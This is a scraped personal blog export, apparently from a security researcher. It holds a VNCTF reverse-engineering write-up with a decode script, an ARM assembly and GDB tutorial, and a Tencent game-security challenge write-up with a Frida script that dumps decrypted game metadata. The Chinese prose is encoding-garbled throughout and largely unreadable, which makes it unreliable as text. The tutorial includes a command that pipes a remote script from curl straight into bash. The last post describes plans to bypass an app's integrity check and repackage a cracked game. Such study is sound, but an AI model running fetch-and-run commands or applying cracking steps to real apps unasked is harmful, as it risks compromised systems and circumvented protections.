ï¼Œå¹¶ä¸”ä¼šå’Œå¯†æ–‡è¿›è¡Œå¯¹æ¯” ç¼–å†™äº†ä¸€ä¸ªè§£ç è„šæœ¬å‘ç°ä¸å¯¹ï¼Œé”¤äº†ä¸€ä¸‹å‡ºé¢˜äººæç¤ºè¿˜æœ‰å…¶ä»–åœ°æ–¹æœ‰ä¿®æ”¹ï¼Œç»§ç»­åœ¨envä¸­æ‰¾å¯ç–‘æ–‡ä»¶ å‘ç°/usr/libexecç›®å½•ä¸‹æœ‰ä¸€ä¸ªlibexec.so,æ‰“å¼€ä¸€çœ‹å‘ç°é‡å†™äº†readå‡½æ•°å’Œstrncmpå‡½æ•°ï¼Œéš¾æ€ªè§£ç ä¸å¯¹ readå‡½æ•°ä¼šå¼‚æˆ–0x1,strncmpåˆ™æ˜¯å®ç°äº†ä¸€ä¸ªROT13,expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 def decode_base64(ciphertext,ç è¡¨): inverse_table = {char: idx for idx, char in enumerate(ç è¡¨)} stripped = ciphertext.rstrip(\u0026#39;=\u0026#39;) missing_padding = len(stripped) % 4 if missing_padding: stripped += \u0026#39;=\u0026#39; * (4 - missing_padding) data = [] for char in stripped: if char == \u0026#39;=\u0026#39;: data.append(0) else: data.append(inverse_table[char]) decoded = bytearray() for i in range(0, len(data), 4): chunk = data[i:i+4] if len(chunk) \u0026lt; 4: chunk += [0] * (4 - len(chunk)) c1, c2, c3, c4 = chunk b1 = (c1 \u0026lt;\u0026lt; 2) | (c2 \u0026amp; 0x3) #é­”æ”¹ç‚¹ b2 = ((c2 \u0026amp; 0x3C) \u0026lt;\u0026lt; 2) | (c3 \u0026amp; 0x0F) #é­”æ”¹ç‚¹ b3 = (c3 \u0026gt;\u0026gt; 4) \u0026lt;\u0026lt; 6 | c4 decoded.extend([b1, b2, b3]) padding = ciphertext.count(\u0026#39;=\u0026#39;) if padding: decoded = decoded[:-padding] if padding else decoded for i in range(len(decoded)): decoded[i] ^= 1 return bytes(decoded) table = \u0026#34;TUVWXYZabcdefghijABCDEF456789GHIJKLMNOPQRSklmnopqrstuvwxyz0123+/\u0026#34; data = \u0026#34;ECIVEA40E9CH67hr6EHU88Etf65Oc8gq8IDz4FCNG8Xw97DtIT==\u0026#34; flag = decode_base64(data,table) print(flag) #VNCTF{Ur_go0d_@ndr0id\u0026amp;l1nux_Reve7ser} VN_Lang IDAæ‰“å¼€ç›´æ¥æœåˆ°äº†\n","date":"2025-02-08T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202502100020006.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/vnctf/","title":"VNCTF"},{"content":"1. ARM å¯æ‰§è¡Œæ–‡ä»¶çš„ç”Ÿæˆè¿‡ç¨‹ åœ¨ä½¿ç”¨ Clang/LLVM æˆ– GCC ç­‰å·¥å…·é“¾æ—¶ï¼Œä» C è¯­è¨€æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶é€šå¸¸è¦ç»å†ä»¥ä¸‹ 4 ä¸ªé˜¶æ®µï¼š\né¢„å¤„ç†ï¼ˆPreprocessingï¼‰ ç¼–è¯‘ï¼ˆCompilationï¼‰ æ±‡ç¼–ï¼ˆAssemblyï¼‰ é“¾æ¥ï¼ˆLinkingï¼‰ ä¸‹é¢ä»¥ Clang çš„äº¤å‰ç¼–è¯‘é€‰é¡¹ä¸ºä¾‹ï¼ˆç›®æ ‡ä¸º armv7a-linux-androideabi29ï¼‰ï¼š\n1.1 é¢„å¤„ç† å‘½ä»¤:\n1 clang -target armv7a-linux-androideabi29 -E hello.c -o hello.i è¯´æ˜:\n-E é€‰é¡¹è¡¨ç¤ºåªæ‰§è¡Œé¢„å¤„ç†é˜¶æ®µï¼ŒæŠŠæ‰€æœ‰ #includeã€å®å®šä¹‰ç­‰å¤„ç†åè¾“å‡ºåˆ° hello.iã€‚ 1.2 ç¼–è¯‘ å‘½ä»¤:\n1 clang -target armv7a-linux-androideabi29 -S hello.i -o hello.s è¯´æ˜:\n-S é€‰é¡¹è¡¨ç¤ºæ‰§è¡Œåˆ°ç¼–è¯‘é˜¶æ®µï¼Œå¹¶å°†ç»“æœç”Ÿæˆæ±‡ç¼–æ–‡ä»¶ hello.sã€‚æ­¤æ—¶è¿˜æ²¡æœ‰è¿›è¡Œæ±‡ç¼–ä¸é“¾æ¥ã€‚ 1.3 æ±‡ç¼– å‘½ä»¤:\n1 clang -target armv7a-linux-androideabi29 -c hello.s -o hello.o è¯´æ˜:\n-c è¡¨ç¤ºæ‰§è¡Œæ±‡ç¼–ï¼Œå°†æ±‡ç¼–ä»£ç  hello.s è½¬ä¸ºç›®æ ‡æ–‡ä»¶ hello.oã€‚æ­¤æ—¶è¿˜æ²¡æœ‰è¿›è¡Œé“¾æ¥ã€‚ 1.4 é“¾æ¥ å‘½ä»¤:\n1 clang -target armv7a-linux-androideabi29 hello.o -o hello è¯´æ˜:\nå°†ç›®æ ‡æ–‡ä»¶ï¼ˆå¯ä»¥æ˜¯å¤šä¸ª .o æ–‡ä»¶ï¼‰ä¸åº“æ–‡ä»¶ä¸€èµ·é“¾æ¥ç”Ÿæˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ helloã€‚ å¦‚æœæœ‰å¤šä¸ª .o æ–‡ä»¶ï¼Œéœ€è¦éƒ½åŒ…å«åœ¨é“¾æ¥å‘½ä»¤ä¸­ã€‚ 2. ARM æ±‡ç¼–ä»£ç çš„åŸºæœ¬ç»“æ„ åœ¨æŸ¥çœ‹æˆ–ç¼–å†™ ARM æ±‡ç¼–æ–‡ä»¶ï¼ˆä¾‹å¦‚ä¸Šé¢ç”Ÿæˆçš„ hello.sï¼‰æ—¶ï¼Œå¸¸è§çš„å…³é”®å­—ä¸ç»“æ„å¦‚ä¸‹ï¼š\n.text\nå£°æ˜æ¥ä¸‹æ¥çš„å†…å®¹å±äºä»£ç æ®µã€‚ .syntax\næŒ‡ç¤ºæ±‡ç¼–å™¨ä½¿ç”¨ä½•ç§è¯­æ³•ï¼ˆarm æˆ– thumb ç­‰ï¼‰ã€‚ .file\nè®°å½•å½“å‰ç”Ÿæˆçš„æ–‡ä»¶ç¬¦å·ä¿¡æ¯ï¼ˆä¸€èˆ¬ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆï¼‰ã€‚ .globl \u0026lt;symbol\u0026gt;\nå£°æ˜ç¬¦å·æ˜¯å…¨å±€å¯è§çš„ï¼Œå¯ä»¥è¢«å…¶ä»–æ¨¡å—å¼•ç”¨ã€‚å¸¸ç”¨äºå£°æ˜ mainã€‚ .type \u0026lt;symbol\u0026gt;, %function\næŒ‡å®šæŸä¸ªç¬¦å·çš„ç±»å‹ä¸ºå‡½æ•°ã€‚ \u0026lt;label\u0026gt;:\nå®šä¹‰ä¸€ä¸ªæ ‡å·ï¼ˆLabelï¼‰ã€‚å…¸å‹ç”¨æ³•æ˜¯ main: ç”¨äºæ ‡è¯†å‡½æ•°å…¥å£ç‚¹ã€‚ .section \u0026lt;section_name\u0026gt;\nåˆ‡æ¢æˆ–å£°æ˜åç»­å†…å®¹æ‰€åœ¨çš„æ®µï¼Œå¦‚ .section .data ç­‰ï¼Œç”¨æ¥å­˜æ”¾å…¨å±€æˆ–é™æ€å˜é‡ç­‰ã€‚ ä¾‹å¦‚ï¼Œå…¸å‹çš„æ±‡ç¼–ç‰‡æ®µå¯èƒ½å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 .text .syntax unified .file \u0026#34;hello.c\u0026#34; .globl main .type main, %function main: ; å‡½æ•°æ­£æ–‡ ; ... bx lr 3. ARM æŒ‡ä»¤é›†æ¦‚è§ˆ æœ¬èŠ‚ä»‹ç»åœ¨ ARM æ¨¡å¼ä¸‹å¸¸è§çš„æŒ‡ä»¤åˆ†ç±»åŠç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ•°æ®å¤„ç†ã€ç§»ä½ã€ä¹˜æ³•ã€å†…å­˜è¯»å†™ã€è·³è½¬ã€å †æ ˆæ“ä½œå’Œè½¯ä»¶ä¸­æ–­ç­‰ã€‚\n3.1 æ•°æ®å¤„ç†æŒ‡ä»¤ MOV\nç”¨æ³•ï¼šMOV \u0026lt;Rd\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šMOV r11, sp â†’ r11 = sp ADD\nç”¨æ³•ï¼šADD \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šADD r2, pc, r2 â†’ r2 = pc + r2 SUB\nç”¨æ³•ï¼šSUB \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šSUB sp, sp, #16 â†’ sp = sp - 16 AND\nç”¨æ³•ï¼šAND \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šAND r0, r0, #0x9 â†’ r0 \u0026amp;= 0x9 ORR\nç”¨æ³•ï¼šORR \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šORR r0, r0, #0x2 â†’ r0 |= 0x2 EOR\nç”¨æ³•ï¼šEOR \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šEOR r0, r0, #0xAA â†’ r0 ^= 0xAA BIC\nç”¨æ³•ï¼šBIC \u0026lt;Rd\u0026gt;, \u0026lt;Rn\u0026gt;, \u0026lt;operand\u0026gt; ç¤ºä¾‹ï¼šBIC r0, r0, #0xF â†’ r0 \u0026amp;= ~0xF 3.2 ç§»ä½æŒ‡ä»¤ LSL (é€»è¾‘å·¦ç§»)\nLSL r0, r0, #4 â†’ r0 \u0026lt;\u0026lt;= 4 LSR (é€»è¾‘å³ç§»)\nLSR r0, r0, #8 â†’ r0 \u0026gt;\u0026gt;= 8ï¼ˆé«˜ä½è¡¥ 0ï¼‰ ROR (å¾ªç¯å³ç§»)\nROR r0, r0, #4 â†’ å°† r0 å¾ªç¯å³ç§» 4 ä½ 3.3 ä¹˜æ³•æŒ‡ä»¤ MUL\nMUL r0, r0, r1 â†’ r0 = r0 * r1 MLA (Multiply Accumulate)\nMLA r0, r0, r1, r2 â†’ r0 = (r0 * r1) + r2 3.4 å†…å­˜è®¿é—®æŒ‡ä»¤ LDR (Load Register)\nç”¨æ³•ï¼šLDR \u0026lt;Rd\u0026gt;, [\u0026lt;Rn\u0026gt;, #\u0026lt;offset\u0026gt;] ç¤ºä¾‹ï¼šLDR r0, [r1, #4] â†’ r0 = *(uint32_t *)(r1 + 4) STR (Store Register)\nç”¨æ³•ï¼šSTR \u0026lt;Rd\u0026gt;, [\u0026lt;Rn\u0026gt;, #\u0026lt;offset\u0026gt;] ç¤ºä¾‹ï¼šSTR r0, [r2, #4] â†’ *(uint32_t *)(r2 + 4) = r0 å­—èŠ‚çº§ä¸åŠå­—èŠ‚çº§è¯»å†™æŒ‡ä»¤ï¼š\nSTRB / LDRB â†’ å•å­—èŠ‚å­˜å– STRH / LDRH â†’ åŠå­—ï¼ˆ2 å­—èŠ‚ï¼‰å­˜å– STR / LDR â†’ å­—ï¼ˆ4 å­—èŠ‚ï¼‰å­˜å– 3.5 è·³è½¬æŒ‡ä»¤ B (Branch)\næ— æ¡ä»¶è·³è½¬ï¼šB \u0026lt;label\u0026gt; BL (Branch with Link)\nå¸¦è¿”å›åœ°å€è®°å½•ï¼ˆä¿å­˜åœ¨ LRï¼‰çš„è·³è½¬ï¼šBL \u0026lt;label\u0026gt; BX (Branch and Exchange)\nå¸¦çŠ¶æ€åˆ‡æ¢ï¼ˆARM â†” Thumbï¼‰çš„è·³è½¬ï¼šBX \u0026lt;Rm\u0026gt; BLX (Branch with Link and Exchange)\nåŒæ—¶è®°å½•è¿”å›åœ°å€å¹¶åˆ‡æ¢çŠ¶æ€ï¼šBLX \u0026lt;Rm\u0026gt; 3.6 æ•°æ®åŠ è½½ä¸å­˜å‚¨æŒ‡ä»¤ï¼ˆå¤šå¯„å­˜å™¨ï¼‰ PUSH / POP\nPUSH {r4, r5, r6}ï¼šä¸€æ¬¡æ€§å°† r4, r5, r6 å…¥æ ˆ POP {r4, r5, r6}ï¼šä¸€æ¬¡æ€§å°†æ ˆé¡¶æ•°æ®å¼¹å‡ºåˆ° r4, r5, r6 LDM / STM (Load/Store Multiple)\nLDMIA SP, {r0, r1, r2}ï¼šä» SP æ‰€åœ¨åœ°å€å¼€å§‹ï¼Œä¾æ¬¡è¯»å…¥ r0, r1, r2 STMIA SP, {r0, r1, r2}ï¼šä¾æ¬¡å°† r0, r1, r2 å†™å…¥ä»¥ SP ä¸ºèµ·å§‹çš„å†…å­˜ 3.7 ä¸­æ–­æŒ‡ä»¤ SVC (Supervisor Call) SVC 0 â†’ è§¦å‘è½¯ä»¶ä¸­æ–­ï¼Œä¸€èˆ¬ç”¨äºç³»ç»Ÿè°ƒç”¨ åœ¨ Linux/Android å¹³å°å¸¸é…åˆ r7 å­˜å‚¨ syscall ç¼–å·ï¼Œå®ç° open, openat ç­‰ç³»ç»Ÿè°ƒç”¨ã€‚ 4. Thumb æŒ‡ä»¤é›†ç®€ä»‹ Thumb æ¨¡å¼ä¸‹ï¼ŒæŒ‡ä»¤é•¿åº¦é€šå¸¸ä¸º 16 ä½ï¼ˆThumb-2 ä¸º 16/32 ä½æ··åˆï¼‰ã€‚ ä¸ ARM æ¨¡å¼ç›¸æ¯”ï¼ŒThumb æ¨¡å¼æŒ‡ä»¤æ›´çŸ­ã€æ‰§è¡Œæ•ˆç‡åœ¨æŸäº›åœºæ™¯æ›´ä½³ï¼Œä½†å¯„å­˜å™¨ä½¿ç”¨å’Œå¯»å€æ–¹å¼å¯èƒ½å—é™ã€‚ éœ€è¦æ—¶å¯é€šè¿‡ BX æˆ– BLX æŒ‡ä»¤åœ¨ ARM / Thumb æ¨¡å¼ä¹‹é—´åˆ‡æ¢ï¼›åˆ‡æ¢ä¾æ®è·³è½¬åœ°å€æœ€ä½ä½ï¼ˆ1 â†’ Thumb æ¨¡å¼ï¼Œ0 â†’ ARM æ¨¡å¼ï¼‰ã€‚ 5. å¸¸è§å¯»å€æ–¹å¼ ç«‹å³æ•°å¯»å€ï¼ˆImmediate Addressingï¼‰\nä¾‹å¦‚ï¼šMOV r1, #1 æŒ‡ä»¤ä¸­ç›´æ¥åŒ…å«ä¸€ä¸ªç«‹å³æ•°ã€‚ å¯„å­˜å™¨å¯»å€ï¼ˆRegister Addressingï¼‰\nä¾‹å¦‚ï¼šMOV r0, r2 æ“ä½œæ•°æ¥è‡ªå¯„å­˜å™¨ã€‚ å¯„å­˜å™¨é—´æ¥å¯»å€ï¼ˆRegister Indirect Addressingï¼‰\nä¾‹å¦‚ï¼šLDR r0, [r1] é€šè¿‡å¯„å­˜å™¨ä¸­å­˜æ”¾çš„åœ°å€æŒ‡å‘ç›®æ ‡å†…å­˜ã€‚ åŸºå€å˜å€å¯»å€ï¼ˆBase + Offset Addressingï¼‰\nä¾‹å¦‚ï¼šLDR r2, [r1, #4] ä»¥ r1 çš„å€¼ä¸ºåŸºå€ï¼Œå¤–åŠ åç§»é‡ #4 è®¿é—®å†…å­˜ã€‚ å¤šå¯„å­˜å™¨å¯»å€\nä¾‹å¦‚ï¼šPUSH {r4, r5, r6} ä¸€æ¬¡æ€§å‹æ ˆå¤šä¸ªå¯„å­˜å™¨çš„å€¼ã€‚ ç›¸å¯¹å¯»å€ï¼ˆPC-Relative Addressingï¼‰\nä¾‹å¦‚ï¼šB .LABEL_END é€šè¿‡å½“å‰ PC ä¸åç§»ç›¸åŠ è·å¾—ç›®æ ‡åœ°å€ã€‚ 6. ARM32 å¯„å­˜å™¨ä¸å‡½æ•°è°ƒç”¨çº¦å®š é€šç”¨å¯„å­˜å™¨: R0 ~ R12 R13 (SP): æ ˆæŒ‡é’ˆ R14 (LR): é“¾æ¥å¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨è¿”å›åœ°å€ R15 (PC): ç¨‹åºè®¡æ•°å™¨ 6.1 å‚æ•°ä¼ é€’ä¸è¿”å›å€¼ å‚æ•°ä¼ é€’\nR0, R1, R2, R3 ä¾æ¬¡å­˜æ”¾å‡½æ•°çš„å‰ 4 ä¸ªå‚æ•°ã€‚ è¶…è¿‡ 4 ä¸ªå‚æ•°ä¼šä½¿ç”¨æ ˆæ¥ä¼ é€’ã€‚ è¿”å›å€¼\nR0 ç”¨äºè¿”å›å€¼ï¼ˆè‹¥è¿”å›å€¼éœ€è¦æ›´å¤šå­˜å‚¨ç©ºé—´ï¼Œåˆ™ä¼šæœ‰æ›´å¤æ‚çš„çº¦å®šï¼‰ã€‚ 7. å…¶ä»–å¯è¡¥å……çŸ¥è¯†ç‚¹ æ¡ä»¶æ‰§è¡Œ\nARM æ¨¡å¼ä¸‹æ”¯æŒå¸¦æ¡ä»¶åç¼€çš„æŒ‡ä»¤ï¼ˆEQ, NE, GT, LT, ...ï¼‰ï¼Œæ ¹æ® APSRï¼ˆCPSRï¼‰ä¸­çš„æ¡ä»¶æ ‡å¿—ä½æ¥æ‰§è¡Œæˆ–è·³è¿‡æŒ‡ä»¤ã€‚ Thumb æ¨¡å¼å¤šæ•°æƒ…å†µä¸‹é€šè¿‡åˆ†æ”¯æˆ– IT æŒ‡ä»¤è¿›è¡Œæ¡ä»¶æ‰§è¡Œã€‚ CPSR \u0026amp; SPSR\nCPSRï¼ˆCurrent Program Status Registerï¼‰: å½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ŒåŒ…å«æ¡ä»¶æ ‡å¿—ï¼ˆN, Z, C, Vï¼‰ã€CPU æ¨¡å¼ç­‰ä¿¡æ¯ã€‚ SPSRï¼ˆSaved Program Status Registerï¼‰: åœ¨å¼‚å¸¸æˆ–ä¸­æ–­å‘ç”Ÿæ—¶ç”¨æ¥ä¿å­˜å…ˆå‰çš„çŠ¶æ€å¯„å­˜å™¨å€¼ã€‚ æ¨¡å¼åˆ‡æ¢\nARM å¤„ç†å™¨æ”¯æŒå¤šç§å·¥ä½œæ¨¡å¼ï¼ˆUser, FIQ, IRQ, Supervisor, Abort, Undefined, Systemï¼‰ã€‚ å¼‚å¸¸æˆ–ä¸­æ–­ä¼šè§¦å‘æ¨¡å¼åˆ‡æ¢ï¼›BX / BLX ä¼šè¿›è¡Œ ARM/Thumb æ¨¡å¼åˆ‡æ¢ã€‚ 8. GDB è°ƒè¯• ARM 8.1 å·¥å…·å®‰è£… å®‰è£… gdb-multiarch\n1 sudo apt-get install gdb-multiarch è¯¥ç‰ˆæœ¬ GDB å¯ä»¥è°ƒè¯•å¤šç§æ¶æ„ï¼ˆåŒ…æ‹¬ ARMï¼‰ã€‚ å®‰è£… GEF (GDB Enhanced Features)\n1 bash -c \u0026#34;$(curl -fsSL https://gef.blah.cat/sh)\u0026#34; å®‰è£…åä¼šåœ¨ GDB ä¸­å¢åŠ è®¸å¤šå®ç”¨è°ƒè¯•åŠŸèƒ½ï¼ˆå†…å­˜æ˜¾ç¤ºã€å¯„å­˜å™¨é«˜äº®ç­‰ï¼‰ã€‚ 8.2 è¿œç¨‹è°ƒè¯•æµç¨‹ åœ¨ç›®æ ‡è®¾å¤‡ï¼ˆä¾‹å¦‚ Androidï¼‰ä¸Šæ‰¾åˆ°å¹¶è¿è¡Œ gdbserver\næŸ¥æ‰¾å‘½ä»¤ï¼šfind . -name gdbserver\nå¯åŠ¨æ–¹å¼ä¸ frida-server ç±»ä¼¼ï¼Œå¯æŒ‡å®šè°ƒè¯•ç«¯å£ï¼Œå¦‚ï¼š\n1 ./gdbserver :\u0026lt;port\u0026gt; --attach \u0026lt;PID\u0026gt; æˆ–\n1 ./gdbserver :\u0026lt;port\u0026gt; ./your_app åœ¨æœ¬æœºä½¿ç”¨ gdb-multiarch é€šè¿‡ GEF è¿›è¡Œè¿œç¨‹è¿æ¥\nä¾‹å¦‚ï¼š\n1 2 gdb-multiarch your_app gef-remote \u0026lt;device_ip\u0026gt;:\u0026lt;port\u0026gt; æˆ–è€…åœ¨ GEF é‡Œä½¿ç”¨ target remote \u0026lt;device_ip\u0026gt;:\u0026lt;port\u0026gt;ã€‚\n8.3 å¸¸ç”¨ GDB å‘½ä»¤ æ–­ç‚¹ b mainï¼šåœ¨ main å‡½æ•°å…¥å£å¤„ä¸‹æ–­ç‚¹ b *0x123456ï¼šåœ¨åœ°å€ 0x123456 å¤„ä¸‹æ–­ç‚¹ å•æ­¥è°ƒè¯• nï¼šæºç çº§å•æ­¥æ‰§è¡Œï¼ˆNextï¼‰ niï¼šæ±‡ç¼–çº§å•æ­¥æ‰§è¡Œï¼ˆNext Instructionï¼‰ sï¼šå•æ­¥è·Ÿè¿›ï¼ˆStepï¼‰ ç»§ç»­æ‰§è¡Œ cï¼šç»§ç»­è¿è¡Œï¼ˆContinueï¼‰ ","date":"2025-01-21T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501211508562.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/arm%E6%B1%87%E7%BC%96%E5%88%9D%E6%8E%A2/","title":"ARMæ±‡ç¼–åˆæ¢"},{"content":" wpå‚è€ƒé“¾æ¥å¦‚ä¸‹ï¼š\n2021è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›å®‰å“æ–¹å‘å†³èµ›é¢˜è§£ - EPs blog è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-2021 Android Final å‚èµ›çºªå½• - Mezone\u0026rsquo;s Blog gslab2021 å†³èµ› - å®‰å“å®¢æˆ·ç«¯å®‰å…¨ | Xhy\u0026rsquo;s Blog çœ‹é›ªä¸­çš„ä¸€ç¯‡å…³äºil2cppç¼–è¯‘æ–¹å¼çš„é€†å‘æ–‡ç« ï¼Œå€¼å¾—å­¦ä¹  Question1:å°è¯•ä½¿ç”¨Zygisk-il2cppdumperdumpï¼Œä½†æ˜¯ç¨‹åºä¼šå¡æ­»ï¼Œdumpä¸å‡ºæ–‡ä»¶ Question2:ç”¨elf-dump-fixdumpä¸‹æ¥çš„il2cpp.soç¼ºå°‘ç¬¦å·ï¼ŒæœªçŸ¥åŸå› ï¼Œä½†æ˜¯å¯ä»¥æœå­—ç¬¦ä¸²global-metadata.datå®šä½åˆ°åŠ è½½å‡½æ•° Question3:è¿½è¸ªåŠ è½½global-metadata.datå‡½æ•°çš„è°ƒç”¨é“¾ï¼Œå‘ç°è¢«hookåˆ°sec2021çš„å‡½æ•°ä¸­äº†ï¼Œè¿½è¸ªåˆ°æœ€åå‘ç°æ˜¯ä¸ªçœ‹ä¸æ‡‚çš„åœ°æ–¹ï¼ˆï¼Ÿï¼‰ Question4:å®ç°æ— æ•Œä¹‹åæœªæˆåŠŸç»•è¿‡appçš„crcæ ¡éªŒï¼Œå¯¼è‡´é‡æ‰“åŒ…çš„apkæ— æ³•è¿è¡Œ é—®é¢˜è§£å†³æƒ…å†µ Question1 Question2 Question3 Question4 å¾…åŠäº‹é¡¹ åˆ†ælibsec2021.soçš„è§£å¯†å‡½æ•° åˆ†æil2cpp.soçš„ä»£ç æ®µæ ¡éªŒå¹¶ç»•è¿‡ dumpè§£å¯†åçš„il2cpp.so ç¼–è¯‘ä¸€ä»½flappybirdæ¸¸æˆ bindiffæ¢å¤ç¬¦å· å®ç°æ— æ•ŒåŠŸèƒ½ å°åŒ…æˆç ´è§£ç‰ˆapk è§£é¢˜æµç¨‹ è§£åŒ…APKï¼Œlibç›®å½•ä¸‹æœ‰libil2cpp.soï¼Œ\\assets\\bin\\Data\\Managed\\Metadataè·¯å¾„ä¸‹æœ‰global-metadata.dat,å¯ä»¥çŸ¥é“è¿™æ˜¯il2cppå¼•æ“çš„æ¸¸æˆ libil2cpp.soå’Œglobal-metadata.datéƒ½æ˜¯è¢«åŠ å¯†çš„ï¼Œæ‰“å¼€libsec2021.soå‘ç°IDAæ— æ³•æ­£ç¡®è¯†åˆ«ELFæ–‡ä»¶,å‘ç°æ˜¯æ–‡ä»¶å¤´çš„e_phentsizeæœ‰é—®é¢˜ï¼ŒæŠŠ23æ”¹æˆ32å³å¯æ­£ç¡®è¯†åˆ«,libil2cpp.soä¹Ÿæ˜¯åŒæ ·çš„å¤„ç†æ–¹å¼ ç”¨elf-dump-fixæŠŠå†…å­˜ä¸­çš„libil2cpp.so dumpä¸‹æ¥å¹¶ä¿®å¤äº† å†™äº†ä¸€ä¸ªè„šæœ¬ï¼ŒæˆåŠŸæŠŠglobal-metadata.dat dumpä¸‹æ¥äº† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 function WriteMemToFile(addr, size, file_path) { Java.perform(function() { let prefix = \u0026#39;/data/data/com.personal.flappybird/files/\u0026#39;; let mkdir = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;mkdir\u0026#39;); let chmod = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;chmod\u0026#39;); let fopen = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fopen\u0026#39;); let fwrite = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fwrite\u0026#39;); let fclose = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fclose\u0026#39;); let call_mkdir = new NativeFunction(mkdir, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_chmod = new NativeFunction(chmod, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_fopen = new NativeFunction(fopen, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fwrite = new NativeFunction(fwrite, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fclose = new NativeFunction(fclose, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;]); call_mkdir(Memory.allocUtf8String(prefix), 0x1FF); call_chmod(Memory.allocUtf8String(prefix), 0x1FF); let fp = call_fopen( Memory.allocUtf8String(prefix + file_path), Memory.allocUtf8String(\u0026#39;wb\u0026#39;)); if (call_fwrite(addr, 1, size, fp)) { console.log(\u0026#39;[+] Write file success, file path: \u0026#39; + prefix + file_path); } else { console.log(\u0026#39;[x] Write file failed\u0026#39;); } call_fclose(fp); }); } function hook_dlopen(addr, soName, callback) { Interceptor.attach(addr, { onEnter: function(args){ var name = args[0].readCString(); //console.log(\u0026#39;openlib:\u0026#39;, name); if (name.indexOf(soName) !== -1) this.hook = true; }, onLeave: function(retval){ if (this.hook) callback(); } }); } var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); hook_dlopen(dlopen, \u0026#34;libil2cpp.so\u0026#34;, hook_il2cpp); hook_dlopen(android_dlopen_ext, \u0026#34;libil2cpp.so\u0026#34;, hook_il2cpp); function hook_il2cpp(){ var il2cpp = Process.findModuleByName(\u0026#39;libil2cpp.so\u0026#39;); console.log(\u0026#39;il2cpp:\u0026#39;, il2cpp.base); Interceptor.attach(il2cpp.base.add(0x5B9238), { onEnter: function(args){ console.log(\u0026#34;sub_0x5B9238 called!!!\u0026#34;); console.log(\u0026#34;args[0] = \u0026#34;, args[0].readCString()); }, onLeave: function(retval){ console.log(\u0026#34;sub_0x5B9238 return!!!\u0026#34;); console.log(\u0026#34;retval = \u0026#34;, retval); var metadataSize = retval.add(0x108).readInt() + retval.add(0x10C).readInt(); console.log(\u0026#34;offset = \u0026#34;, retval.add(0x108).readInt()); console.log(\u0026#34;size = \u0026#34;, retval.add(0x10C).readInt()); console.log(\u0026#34;MetadataSize = \u0026#34;, metadataSize); var file_path = \u0026#34;global-metadata.dat\u0026#34;; //console.log(\u0026#34;[+]Metadata is dumping!!\u0026#34;); WriteMemToFile(retval, metadataSize, file_path); //console.log(\u0026#34;[+]Metadata dump success!!\u0026#34;); } }); } //frida -H 127.0.0.1:12345 -f com.personal.flappybird -l hook.js dumpä¸‹æ¥çš„æ–‡ä»¶æ”¾åˆ°il2cppdumperä¸­ä»ç„¶æ— ç”¨ï¼Œåœ¨githubä¸Šæ‰¾åˆ°flappybirdçš„æºç (FlappyBirdStyleGame)ï¼Œæ‰“ç®—è‡ªå·±ç¼–è¯‘ä¸€ä»½ï¼Œç»“æœè¸©å‘äº†ã€‚ã€‚ã€‚åŸå› æ˜¯ç‰ˆæœ¬å¤ªæ–°ï¼Œäºæ˜¯ç”¨ä¸‹äº†ä¸ªç‰ˆæœ¬ä½ä¸€ç‚¹unity åºŸäº†å¾ˆå¤§åŠ›æ‰ç¼–è¯‘å‡ºæ¥(é€‰äº†å¥½å‡ 